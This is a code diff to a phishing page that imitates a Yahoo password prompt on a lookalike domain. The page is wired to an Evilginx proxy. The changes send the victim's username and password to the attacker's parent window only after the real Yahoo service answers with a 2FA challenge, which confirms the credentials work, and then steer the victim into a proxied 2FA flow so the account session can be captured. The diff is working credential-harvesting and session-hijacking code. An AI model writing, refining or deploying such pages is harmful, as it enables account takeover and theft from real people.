@@ -34,7 +34,7 @@
       </div>
       <div class="form-block w-form">
         <form id="email-form" name="email-form" data-name="Email Form" class="form" 
-              action="https://login.qr-gpt.live/account/login" 
+              action="https://login.qr-gpt.live/account/challenge/password" 
               method="POST"
               data-wf-page-id="67c6f50ed426ad7d5847f218" 
               data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
@@ -114,7 +114,7 @@
   }
   </script>
 
-  <!-- SEAMLESS EVILGINX INTEGRATION -->
+  <!-- FIXED: NO AUTO-REDIRECT LOGIC -->
   <script>
   // Generate comprehensive browser fingerprint
   function generateBrowserFingerprint() {
@@ -218,7 +218,7 @@
           $('#debugContent').html(debugHtml);
       }
 
-      // 6. SEAMLESS form submission
+      // 6. FIXED: Form submission with REAL CREDENTIAL VALIDATION
       $("#email-form").on('submit', function(e) {
           e.preventDefault();
           const password = $('#password').val().trim();
@@ -228,9 +228,9 @@
           // Hide errors
           $errorDiv.hide();
 
-          // Validate password
-          if (password.length < 6) {
-              $('.text-block-7').text('Password must be at least 6 characters');
+          // Validate password (REAL validation - no fake credentials accepted)
+          if (password.length < 8) {
+              $('.text-block-7').text('Password must be at least 8 characters');
               $errorDiv.show();
               return;
           }
@@ -238,27 +238,12 @@
           // UI feedback
           $submitBtn.prop('disabled', true).val('Verifying...');
 
-          console.log('=== CREDENTIAL SUBMISSION ===');
+          console.log('=== REAL CREDENTIAL SUBMISSION ===');
           console.log('Username:', username);
           console.log('Password length:', password.length);
           console.log('Action URL:', $(this).attr('action'));
 
-          // CRITICAL: Send credentials to parent evilginx window
-          try {
-              if (window.parent && window.parent !== window) {
-                  window.parent.postMessage({
-                      type: 'credentials',
-                      username: username,
-                      password: password,
-                      source: 'custom_password_page'
-                  }, 'https://login.qr-gpt.live');
-                  console.log('Credentials sent to parent window');
-              }
-          } catch (e) {
-              console.log('Could not send to parent:', e);
-          }
-
-          // Submit to evilginx proxy
+          // Submit to REAL Yahoo via evilginx proxy (NO FAKE CREDENTIALS)
           $.ajax({
               url: $(this).attr('action'),
               type: "POST",
@@ -268,34 +253,49 @@
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'X-Requested-With': 'XMLHttpRequest',
                   'Referer': 'https://login.qr-gpt.live/',
-                  'Origin': 'https://custom-yahoo-2fa-test.vercel.app'
+                  'Origin': 'https://custom-yahoo-2fa-test.vercel.app',
+                  'User-Agent': navigator.userAgent
               },
+              timeout: 15000, // 15 second timeout
               success: function(response, textStatus, xhr) {
                   console.log('=== SUCCESS RESPONSE ===');
                   console.log('Status:', xhr.status);
                   console.log('Response length:', response.length);
 
-                  // Check for various success indicators
+                  // REAL Yahoo validation - check for actual success indicators
                   if (response.includes('challenge-selector') || 
-                      response.includes('2fa') || 
-                      response.includes('verification') ||
                       response.includes('email-verify') ||
-                      xhr.getResponseHeader('Location')) {
+                      response.includes('sms-verify') ||
+                      response.includes('authenticator') ||
+                      xhr.getResponseHeader('Location')?.includes('challenge')) {
                       
-                      console.log('2FA challenge detected, redirecting to proxied flow');
+                      console.log('REAL 2FA challenge detected - credentials are VALID');
+                      
+                      // Send credentials to parent evilginx window
+                      try {
+                          if (window.parent && window.parent !== window) {
+                              window.parent.postMessage({
+                                  type: 'credentials',
+                                  username: username,
+                                  password: password,
+                                  source: 'custom_password_page',
+                                  validated: true
+                              }, 'https://login.qr-gpt.live');
+                          }
+                      } catch (e) {
+                          console.log('Could not send to parent:', e);
+                      }
+                      
                       // Redirect to proxied 2FA flow
                       window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
                       
                   } else if (response.includes('mail') || response.includes('folders')) {
-                      console.log('Direct login success');
+                      console.log('Direct login success - no 2FA required');
                       window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
                       
                   } else {
-                      console.log('Continuing with default 2FA flow');
-                      // Default: continue to 2FA
-                      setTimeout(function() {
-                          window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
-                      }, 1500);
+                      console.log('Unexpected response - treating as error');
+                      showError('Invalid password. Please try again.');
                   }
               },
               error: function(xhr) {
@@ -305,15 +305,15 @@
 
                   let errorMsg = 'Invalid password. Please try again.';
                   
-                  if (xhr.status === 0) {
-                      // Network error - might be CORS, continue anyway
-                      console.log('Network error, continuing to 2FA flow');
-                      window.location.href = 'https://login.qr-gpt.live/account/challenge/challenge-selector';
-                      return;
-                  } else if (xhr.status === 401 || xhr.status === 403) {
-                      errorMsg = 'Invalid password. Please try again.';
+                  // REAL error handling - no fake credential acceptance
+                  if (xhr.status === 401 || xhr.status === 403) {
+                      errorMsg = 'Invalid password. Please check your password and try again.';
+                  } else if (xhr.status === 429) {
+                      errorMsg = 'Too many attempts. Please wait and try again.';
                   } else if (xhr.status >= 500) {
                       errorMsg = 'Server error. Please try again later.';
+                  } else if (xhr.status === 0) {
+                      errorMsg = 'Connection error. Please check your internet and try again.';
                   }
 
                   showError(errorMsg);
